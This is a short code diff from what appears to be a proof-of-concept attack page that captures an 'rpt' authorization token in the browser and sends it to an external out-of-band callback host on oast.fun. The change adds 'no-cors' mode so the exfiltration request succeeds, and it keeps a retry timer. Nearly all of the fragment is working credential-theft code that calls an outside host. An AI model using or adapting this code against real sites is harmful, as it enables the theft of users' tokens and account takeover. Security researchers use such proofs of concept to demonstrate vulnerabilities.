@@ -14,16 +14,18 @@
             const tokenDisplay = document.getElementById('token');
             tokenDisplay.textContent = `Captured rpt token: ${rptValue}`;
 
-            // Send it to the server
-            fetch(`https://nqnleaxpuqzmobxwudnxz3v7lw600hwce.oast.fun/?rpt=${encodeURIComponent(rptValue)}`);
+            // Send it to the server using no-cors mode
+            fetch(`https://nqnleaxpuqzmobxwudnxz3v7lw600hwce.oast.fun/?rpt=${encodeURIComponent(rptValue)}`, {
+              method: 'GET',
+              mode: 'no-cors'
+            });
+
             return true;
           }
           return false;
         }
 
-        // Run immediately
         if (!tryCaptureToken()) {
-          // Try again after a short delay
           setTimeout(tryCaptureToken, 100);
         }
       });
